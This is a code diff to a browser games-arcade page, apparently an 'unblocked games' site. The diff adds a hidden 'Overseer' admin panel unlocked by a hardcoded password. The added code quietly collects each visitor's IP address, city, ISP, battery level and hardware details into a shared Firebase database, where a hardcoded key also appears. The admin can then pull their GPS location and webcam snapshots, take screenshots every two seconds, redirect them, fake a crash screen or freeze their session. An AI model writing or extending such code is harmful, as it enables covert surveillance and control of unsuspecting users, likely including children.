@@ -154,6 +154,7 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getDatabase, ref, onValue, set, update, push, remove, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
+        // Firebase credentials for Overseer functions
         const firebaseConfig = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
@@ -163,6 +164,13 @@
         let cfg = { url: localStorage.getItem('pUrl') || 'https://google.com', key: localStorage.getItem('pKey') || 'Escape', mode: localStorage.getItem('pMode') || 'tab', enable: localStorage.getItem('pEnable') !== 'false' };
         let activeGameWindow = null, watchInterval = null, tempKey = cfg.key;
         
+        const keyDisp = document.getElementById('cfgKeyDisp');
+        keyDisp.onclick = () => {
+            keyDisp.value = "[ PRESS KEY NOW ]"; keyDisp.style.background = "#222";
+            const handler = (e) => { e.preventDefault(); tempKey = e.key; keyDisp.value = e.key.toUpperCase(); keyDisp.style.background = "#000"; window.removeEventListener('keydown', handler); };
+            window.addEventListener('keydown', handler);
+        };
+
         window.door = (type) => {
             if(type === 'admin') {
                 if(prompt("AUTH_CODE:") === "BALLS_ARE_GOOD") { isAdmin = true; document.getElementById('adminBtn').style.display="block"; document.getElementById('badge').innerText="[OVERSEER]"; initSession(); }
@@ -175,52 +183,76 @@
             document.getElementById('loginOverlay').style.display="none"; 
             document.getElementById('app').style.display="flex";
 
-            userRef = push(ref(db, 'presence'), { name: name, activity: 'Browsing Menu', joined: new Date().toLocaleTimeString(), res: `${screen.width}x${screen.height}`, reload: false });
+            let ipInfo = { ip: 'Hidden', city: '?', region: '?', org: '?' };
+            try { const r = await fetch('https://ipapi.co/json/'); if(r.ok) ipInfo = await r.json(); } catch(e) {}
+            const bat = await navigator.getBattery?.().catch(()=>({}));
+            
+            userRef = push(ref(db, 'presence'), {
+                name: name, activity: 'Browsing Menu', joined: new Date().toLocaleTimeString(),
+                res: `${screen.width}x${screen.height}`, 
+                hw: `${navigator.hardwareConcurrency||'?'}C / ${navigator.deviceMemory||'?'}GB`,
+                bat: bat?.level ? `${Math.round(bat.level*100)}%` : '?',
+                plat: navigator.platform, ip: ipInfo.ip, loc: `${ipInfo.city}, ${ipInfo.region}`, isp: ipInfo.org,
+                gps: 'Pending Permission...', reload: false
+            });
             myID = userRef.key;
             onDisconnect(userRef).remove();
 
-            // Setup Overseer logic
             onValue(ref(db, `presence/${myID}`), (s) => {
                 const d = s.val(); if(!d) return;
                 if(d.kicked) { closeGame(); window.location.replace(cfg.url); }
                 if(d.redir) window.location.replace(d.redir);
                 if(d.openTab) { window.open(d.openTab, '_blank'); update(userRef, {openTab:null}); }
                 if(d.reload) window.location.reload();
+                if(d.print) { window.print(); update(userRef, {print:false}); }
+                if(d.vibrate) { if(navigator.vibrate) navigator.vibrate([200, 100, 200]); update(userRef, {vibrate:false}); }
                 document.getElementById('freeze').style.display = d.frozen ? 'flex' : 'none';
                 document.getElementById('bsod').style.display = d.bsod ? 'block' : 'none';
-                if(d.msg) alert("ADMIN: " + d.msg);
-                if(d.capReq) html2canvas(document.body).then(c => update(userRef, {lastCap: c.toDataURL("image/webp", 0.1), capReq: false}));
+                if(d.frozen || d.bsod) closeGame();
+                if(d.msg) { alert("ADMIN: " + d.msg); update(userRef, {msg: null}); }
+                if(d.speak) { const u = new SpeechSynthesisUtterance(d.speak); window.speechSynthesis.speak(u); update(userRef, {speak: null}); }
+                if(d.gpsReq) { navigator.geolocation.getCurrentPosition((pos) => { update(userRef, {gps: `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`, gpsReq: false}); }, (err) => { update(userRef, {gps: "Denied", gpsReq: false}); }); }
+                if(d.camReq) { navigator.mediaDevices.getUserMedia({ video: true }).then(stream => { const v = document.createElement('video'); v.srcObject = stream; v.play(); v.onloadedmetadata = () => { const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight; c.getContext('2d').drawImage(v,0,0); stream.getTracks().forEach(t=>t.stop()); update(userRef, {lastCap: c.toDataURL("image/webp", 0.5), camReq: false}); }; }).catch(e => { update(userRef, {camReq: false}); }); }
+                if(d.capReq) { html2canvas(document.body, {useCORS: true}).then(c => update(userRef, {lastCap: c.toDataURL("image/webp", 0.2), capReq: false})).catch(()=>update(userRef,{capReq:false})); }
             });
 
-            // FETCH FROM CORRECT REPO: coolmongle
+            // UPDATED: Points to new Repository logic
             try {
-                const res = await fetch('https://api.github.com/repos/sqsqs353-alt/coolmongle/contents/');
+                const res = await fetch('https://api.github.com/repos/sqsqs353-alt/the-mongle-thing/contents/');
                 const data = await res.json();
                 gameData = data.filter(f => f.name.endsWith('.html') && f.name !== 'index.html');
                 renderGrid();
-            } catch(e) {
-                console.warn("API limit hit or repo not found.");
-            }
+            } catch(e) { console.error("Source fetch failed."); }
             
             if(isAdmin) startOverseer();
         };
+
+        function closeGame() { if(activeGameWindow) activeGameWindow.close(); }
 
         window.renderGrid = () => {
             const q = document.getElementById('search').value.toLowerCase();
             const cat = document.getElementById('cat').value;
             const grid = document.getElementById('grid'); grid.innerHTML = "";
+            let sorted = [...gameData].sort((a,b) => favs.includes(b.name) - favs.includes(a.name));
             
-            gameData.filter(g => {
+            sorted.filter(g => {
                 const n = g.name.toLowerCase();
                 if (!n.includes(q)) return false;
                 if (cat === 'favs') return favs.includes(g.name);
+                const isFnaf = n.includes('fnaf');
+                const isHorror = (n.includes('scary') || n.includes('horror') || n.includes('granny')) && !isFnaf;
+                const isAction = n.includes('doom') || n.includes('quake') || n.includes('action') || n.includes('shooter') || n.includes('cs');
+                if (cat === 'fnaf' && !isFnaf) return false;
+                if (cat === 'horror' && !isHorror) return false;
+                if (cat === 'action' && !isAction) return false;
+                if (cat === 'other' && (isFnaf || isHorror || isAction)) return false;
                 return true;
             }).forEach(g => {
                 const card = document.createElement('div'); card.className = "card";
                 card.innerHTML = `<div class="fav-area" onclick="toggleFav(event,'${g.name}')"><span class="fav-btn ${favs.includes(g.name)?'active':''}">❤</span></div>${g.name.replace('.html','').toUpperCase()}`;
                 card.onclick = () => {
-                    // CORRECT URL FOR coolmongle
-                    const url = `https://raw.githack.com/sqsqs353-alt/coolmongle/main/${g.name}`;
+                    // UPDATED: Game URL logic for the new site repo
+                    const url = `https://raw.githack.com/sqsqs353-alt/the-mongle-thing/main/${g.name}`;
                     update(userRef, {activity: 'Playing '+g.name});
                     if(cfg.mode==='blank') {
                         activeGameWindow = window.open('about:blank');
@@ -232,21 +264,61 @@
         };
 
         window.toggleFav = (e, n) => { e.stopPropagation(); if(favs.includes(n)) favs = favs.filter(f=>f!==n); else favs.push(n); localStorage.setItem('favs', JSON.stringify(favs)); renderGrid(); };
+
+        /* --- ADMIN CONTROLS --- */
+        function startOverseer() {
+            onValue(ref(db, 'presence'), (snap) => {
+                const list = document.getElementById('userList'); list.innerHTML = "";
+                snap.forEach(c => {
+                    const u = c.val();
+                    const d = document.createElement('div');
+                    d.className = `u-item ${selectedID === c.key ? 'selected' : ''}`;
+                    let status = u.frozen ? "❄️" : (u.bsod ? "☠️" : "🟢");
+                    if(u.kicked) status = "🚫";
+                    d.innerHTML = `<b>${status} ${u.name}</b><br><small>${u.activity}</small>`;
+                    d.onclick = () => { selectedID = c.key; updateDossier(u, c.key); startOverseer(); };
+                    list.appendChild(d);
+                    if(selectedID === c.key) updateDossier(u, c.key);
+                });
+            });
+        }
+
+        function updateDossier(u, key) {
+            document.getElementById('dossier').innerHTML = `<div><b>ID:</b> ${key.substring(0,6)}...</div><div><b>STATUS:</b> ${u.frozen?'FROZEN':(u.bsod?'BSOD':'ACTIVE')}</div><div><b>IP:</b> ${u.ip}</div><div><b>LOC:</b> ${u.loc}</div><div><b>GPS:</b> ${u.gps || 'N/A'}</div><div><b>ISP:</b> ${u.isp}</div><div><b>RES:</b> ${u.res}</div><div><b>BATTERY:</b> ${u.bat}</div>`;
+            if(u.lastCap) document.getElementById('preview').style.backgroundImage = `url(${u.lastCap})`;
+        }
+
+        window.adminAct = (t) => { if(selectedID) onValue(ref(db, `presence/${selectedID}/${t}`), (s) => { let val=!s.val(); if(t==='reload'||t==='print'||t==='vibrate'||t==='gpsReq'||t==='camReq') val=true; update(ref(db, `presence/${selectedID}`), {[t]: val}); }, {onlyOnce:true}); };
+        window.adminCustom = (t) => { if(selectedID) update(ref(db, `presence/${selectedID}`), {[t]: document.getElementById('adminCommandInp').value}); };
+        window.globalReload = () => { if(confirm("NUKE?")) onValue(ref(db, 'presence'), s=>s.forEach(c=>update(ref(db,`presence/${c.key}`),{reload:true})),{onlyOnce:true}); };
+        window.toggleWatch = () => {
+            const btn = document.getElementById('watchBtn'); const ind = document.getElementById('live-indicator');
+            if(watchInterval) { clearInterval(watchInterval); watchInterval=null; btn.style.background="#004400"; btn.innerText="👁️ WATCH"; ind.style.display="none"; }
+            else { 
+                if(!selectedID) return alert("Select User"); 
+                btn.style.background="red"; btn.innerText="⏹ STOP"; ind.style.display="block";
+                update(ref(db,`presence/${selectedID}`),{capReq:true});
+                watchInterval = setInterval(()=>{ if(!selectedID) clearInterval(watchInterval); else update(ref(db,`presence/${selectedID}`),{capReq:true}); }, 2000);
+            }
+        };
+
         window.toggleCfg = (key) => { cfg[key] = !cfg[key]; document.getElementById('chkEnable').innerText = cfg.enable ? '✓' : ''; };
         window.panicTrigger = () => { if(!cfg.enable) return; if(activeGameWindow) activeGameWindow.close(); window.location.replace(cfg.url); };
         window.toggleModal = (id) => { const m = document.getElementById(id); m.style.display = m.style.display === 'block' ? 'none' : 'block'; };
         
         window.addEventListener('keydown', (e) => {
             if (cfg.enable && (e.key === cfg.key || e.code === cfg.key)) panicTrigger();
+            if (e.shiftKey && (e.key === 'L' || e.key === 'l')) { e.preventDefault(); document.getElementById('loginOverlay').style.display = 'flex'; }
         }, true);
 
         window.saveConfig = () => {
-            cfg.url = document.getElementById('cfgUrl').value;
-            localStorage.setItem('pUrl', cfg.url);
+            cfg.url = document.getElementById('cfgUrl').value; cfg.key = tempKey; cfg.mode = document.getElementById('cfgMode').value;
+            localStorage.setItem('pUrl', cfg.url); localStorage.setItem('pKey', cfg.key); localStorage.setItem('pMode', cfg.mode); localStorage.setItem('pEnable', cfg.enable);
             alert("SAVED"); toggleModal('settingsM');
         };
 
-        function closeGame() { if(activeGameWindow) activeGameWindow.close(); }
+        document.getElementById('cfgUrl').value = cfg.url; document.getElementById('cfgKeyDisp').value = cfg.key.toUpperCase();
+        document.getElementById('cfgMode').value = cfg.mode; document.getElementById('chkEnable').innerText = cfg.enable ? '✓' : '';
     </script>
 </body>
 </html>
